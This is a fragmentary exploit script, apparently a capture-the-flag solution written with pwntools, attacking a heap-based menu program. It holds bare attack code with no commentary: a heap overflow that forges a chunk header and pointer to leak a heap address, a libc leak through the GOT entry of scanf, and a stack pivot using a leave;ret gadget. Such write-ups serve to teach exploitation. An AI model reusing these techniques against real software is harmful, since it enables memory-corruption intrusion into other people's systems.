...
# Heap Leak
Edit(0, "a"*0x28+p64(0x21)+p64(0x602100), 0)

Add("a", 4)
Add(p64(0x602100), 0x6020a0)
...
# libc leak
Edit(14, "X", elf.got.__isoc99_scanf)

List()
for i in range(13):
  s.recvuntil("Price: ")
scanf_addr  = int(s.recvuntil("\n"))
libc_base   = scanf_addr - libc.sym.__isoc99_scanf
...
# Stack pivot
Sell(3, "b"*0x18+p64(3)+p64(0)*2+p64(heap_base + 0x1780 - 8) + p64(leave_ret))
